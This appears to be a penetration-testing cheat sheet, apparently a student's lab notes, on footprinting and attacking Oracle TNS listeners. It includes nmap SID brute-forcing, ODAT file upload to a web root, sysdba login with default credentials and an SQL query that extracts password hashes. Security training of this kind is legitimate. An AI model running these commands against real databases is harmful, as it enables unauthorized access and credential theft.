- The Oracle Transparent Network Substrate(**TNS**) facilitates communication between Oracle databases and applications over networks. Part of Oracle Net Services suite.

- Supports protocols such as **IPX/SPX**, **UDP**, **AppleTalk**, and **TCP/IP**(default: **port 1521 TCP**).

- Preferred solution for managing large, complex databases (healthcare, finance, retail, etc).

- TNS can be remotely managed in **Oracle 8i/9i**, but not in Oracle 10g/11g.

- Often used with other Oracle services like Oracle **DBSNMP**, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, **web servers**, and much more.

- The System Identifier(**SID**) identifies an arbitrary database instance.

# Footprinting the Service
**Nmap**
```bash
# Discovery
sudo nmap -sV -p1521 $TARGET --open

# SID Brute-Forcing
sudo nmap -sV -p1521 $TARGET --open --script=oracle-sid-brute
```


**Oracle Database Attack Tool (ODAT)
```bash
./odat.py all -s $TARGET

# Upload Files
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

**Logging In - SQLPlus
```bash
sqlplus user/pass@$TARGET/XE

# As Administrator:
sqlplus user/pass@$TARGET/XE as sysdba
```

**Interaction**
```sql
-- Enumerate Tables
SQL> SELECT table_name FROM all_tables;

-- Enumerate User Privileges
SQL> SELECT * FROM user_role_privs;

-- Extract Password Hashes
SQL> select name, password from sys.user$;
```
